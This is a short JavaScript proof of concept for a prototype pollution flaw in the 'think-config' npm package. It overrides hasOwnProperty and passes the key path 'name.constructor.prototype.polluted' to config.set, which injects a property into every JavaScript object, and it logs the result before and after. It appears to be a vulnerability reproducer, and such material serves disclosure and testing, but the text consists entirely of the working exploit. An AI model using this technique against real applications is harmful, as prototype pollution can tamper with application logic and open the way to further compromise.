Object.prototype.hasOwnProperty = () => true;
const Config = require('think-config');
const config = new Config({ name: 2 });
console.log({}.polluted);
let obj = {};
config.set('name.constructor.prototype.polluted', 'yes');
console.log({}.polluted);